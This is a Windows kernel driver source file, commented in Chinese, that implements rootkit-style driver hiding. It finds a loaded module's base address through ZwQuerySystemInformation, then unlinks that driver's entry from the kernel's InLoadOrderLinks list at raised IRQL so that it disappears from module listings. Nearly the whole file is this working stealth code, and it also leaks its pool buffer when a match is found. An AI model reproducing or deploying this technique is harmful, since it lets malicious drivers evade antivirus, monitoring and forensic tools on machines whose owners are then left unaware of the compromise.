#include <ntifs.h>
#include "HideDriver.h"

#define kprintf		DbgPrint
#define kmalloc(_s)	ExAllocatePoolWithTag(NonPagedPool, _s, 'SYSQ')
#define kfree(_p)	ExFreePool(_p)
//然后是R0隐藏内核模块，摘链问题。也就是要注意结构定义细节就行了。
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation
(
	IN ULONG	SystemInformationClass,
	OUT PVOID	SystemInformation,
	IN ULONG	Length,
	OUT PULONG	ReturnLength
);

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
	ULONG Unknow1;
	ULONG Unknow2;
	ULONG Unknow3;
	ULONG Unknow4;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	char ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;//内核中以加载的模块的个数
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY64 InLoadOrderLinks;
	ULONG64 __Undefined1;
	ULONG64 __Undefined2;
	ULONG64 __Undefined3;
	ULONG64 NonPagedDebugInfo;
	ULONG64 DllBase;
	ULONG64 EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG   Flags;
	USHORT  LoadCount;
	USHORT  __Undefined5;
	ULONG64 __Undefined6;
	ULONG   CheckSum;
	ULONG   __padding1;
	ULONG   TimeDateStamp;
	ULONG   __padding2;
}KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;


ULONG64 GetSystemModuleBase(char* lpModuleName)
{
	ULONG NeedSize, i, ModuleCount, BufferSize = 0x5000;
	PVOID pBuffer = NULL;
	PCHAR pDrvName = NULL;
	NTSTATUS Result;
	PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;
	do
	{
		//分配内存
		pBuffer = kmalloc(BufferSize);
		if (pBuffer == NULL)
			return 0;
		//查询模块信息
		Result = ZwQuerySystemInformation(11, pBuffer, BufferSize, &NeedSize);
		if (Result == STATUS_INFO_LENGTH_MISMATCH)
		{
			kfree(pBuffer);
			BufferSize *= 2;
		}
		else if (!NT_SUCCESS(Result))
		{
			//查询失败则退出
			kfree(pBuffer);
			return 0;
		}
	} while (Result == STATUS_INFO_LENGTH_MISMATCH);
	pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)pBuffer;
	//获得模块的总数量
	ModuleCount = pSystemModuleInformation->Count;
	//遍历所有的模块
	for (i = 0; i < ModuleCount; i++)
	{
		if ((ULONG64)(pSystemModuleInformation->Module[i].Base) > (ULONG64)0x8000000000000000)
		{
			pDrvName = pSystemModuleInformation->Module[i].ImageName + pSystemModuleInformation->Module[i].ModuleNameOffset;
			if (strstr(pDrvName, lpModuleName) != FALSE) {
				DbgPrint("匹配成功");
				DbgPrint("返回了pDrvName = %s, Addr = %p", pSystemModuleInformation->Module[i].ImageName, pSystemModuleInformation->Module[i].Base);
				return (ULONG64)pSystemModuleInformation->Module[i].Base;
			}

		}
	}
	kfree(pBuffer);
	return 0;
}

VOID HideDriver(char* pDrvName, PDRIVER_OBJECT pDriverObject)
{
	PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PKLDR_DATA_TABLE_ENTRY firstentry;
	ULONG64 pDrvBase = 0;
	KIRQL OldIrql;
	firstentry = entry;
	DbgPrint("要隐藏的驱动文件名= %s", pDrvName);
	pDrvBase = GetSystemModuleBase(pDrvName);
	//DbgPrint("pDrvBase = %llu",pDrvBase);
	while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != firstentry)
	{

		if (entry->DllBase == pDrvBase)
		{
			//typedef struct LIST_ENTRY64 {
			//	ULONGLONG Flink;
			//	ULONGLONG Blink;
			//} LIST_ENTRY64;
			//typedef LIST_ENTRY64 *PLIST_ENTRY64;
			//le->Flink->Blink=le->Blink;
			//le->Blink->Flink=le->Flink;
			OldIrql = KeRaiseIrqlToDpcLevel();
			((LIST_ENTRY64*)(entry->InLoadOrderLinks.Flink))->Blink = entry->InLoadOrderLinks.Blink;
			((LIST_ENTRY64*)(entry->InLoadOrderLinks.Blink))->Flink = entry->InLoadOrderLinks.Flink;
			entry->InLoadOrderLinks.Flink = 0;
			entry->InLoadOrderLinks.Blink = 0;
			KeLowerIrql(OldIrql);
			DbgPrint("Remove LIST_ENTRY64 OK!");
			break;
		}
		//kprintf("%llx\t%wZ\t%wZ",entry->DllBase,entry->BaseDllName,entry->FullDllName);
		entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
	}
}

